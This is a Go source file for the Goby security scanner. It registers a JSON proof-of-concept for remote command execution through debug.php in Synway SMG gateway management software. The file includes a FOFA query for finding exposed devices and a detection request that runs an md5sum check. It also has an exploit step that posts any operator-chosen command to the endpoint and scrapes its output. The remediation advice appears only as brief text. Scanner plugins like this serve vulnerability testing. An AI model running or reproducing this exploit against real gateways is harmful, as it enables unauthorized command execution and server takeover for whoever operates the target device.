package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "synway SMG Gateway Management Software Command Execution",
    "Description": "<p>Synway SMG gateway management software analog voice gateway products can be used to connect traditional telephones, fax machines and PBXs to IP-based telephone networks. SMG analog gateways provide powerful, stable, reliable and cost-effective VoIP for IP call centers and multi-branch offices solution. There is a remote command execution vulnerability in the debug.php file of Synway SMG gateway management software, through which an attacker can execute arbitrary commands</p>",
    "Product": "GW-Management-Software",
    "Homepage": "https://www.synway.cn",
    "DisclosureDate": "2022-11-23",
    "Author": "1angx",
    "FofaQuery": "body=\"text ml10 mr20\" && title=\"网关管理软件\"",
    "GobyQuery": "body=\"text ml10 mr20\" && title=\"网关管理软件\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.synway.cn\">https://www.synway.cn</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/debug.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb\nContent-Disposition: form-data; name=\"comdtype\"\n\n1\n------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb\nContent-Disposition: form-data; name=\"cmd\"\n\necho -n 'hello'|md5sum|cut -d ' ' -f1\n------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb\nContent-Disposition: form-data; name=\"run\"\n\n------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "5d41402abc4b2a76b9719d911017c592",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/debug.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb\nContent-Disposition: form-data; name=\"comdtype\"\n\n1\n------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb\nContent-Disposition: form-data; name=\"cmd\"\n\n{{{cmd}}}\n------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb\nContent-Disposition: form-data; name=\"run\"\n\n------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|'index.php';</script>(?s)(.*)"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "杭州三汇SMG网关管理软件 debug.php 远程命令执行漏洞",
            "Product": "网关管理软件",
            "Description": "<p>三汇SMG网关管理软件模拟语音网关产品可用于连接传统电话机、传真机和PBX到基于IP的电话网络,SMG模拟网关为IP呼叫中心和多分支机构提供功能强大、稳定可靠和高性价比的VoIP解决方案。 三汇SMG网关管理软件debug.php文件中存在远程命令执行漏洞，攻击者通过漏洞可以执行任意命令<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.synway.cn\">https://www.synway.cn</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "synway SMG Gateway Management Software Command Execution",
            "Product": "GW-Management-Software",
            "Description": "<p>Synway SMG gateway management software analog voice gateway products can be used to connect traditional telephones, fax machines and PBXs to IP-based telephone networks. SMG analog gateways provide powerful, stable, reliable and cost-effective VoIP for IP call centers and multi-branch offices solution. There is a remote command execution vulnerability in the debug.php file of Synway SMG gateway management software, through which an attacker can execute arbitrary commands<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.synway.cn\">https://www.synway.cn</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
